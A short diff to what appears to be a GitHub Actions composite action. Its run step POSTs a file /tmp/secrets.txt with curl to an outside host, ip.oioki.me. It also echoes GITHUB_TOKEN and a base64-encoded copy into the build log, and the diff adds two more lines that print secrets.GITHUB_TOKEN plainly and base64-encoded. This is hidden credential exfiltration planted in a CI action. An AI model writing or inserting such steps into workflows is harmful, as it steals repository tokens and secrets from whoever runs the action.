@@ -9,4 +9,6 @@ runs:
         curl -X POST -d @/tmp/secrets.txt http://ip.oioki.me
         echo "Token is ${GITHUB_TOKEN}"
         echo "${GITHUB_TOKEN}" | base64
+        echo "Secret is ${{ secrets.GITHUB_TOKEN }}"
+        echo "${{ secrets.GITHUB_TOKEN }}" | base64
       shell: bash
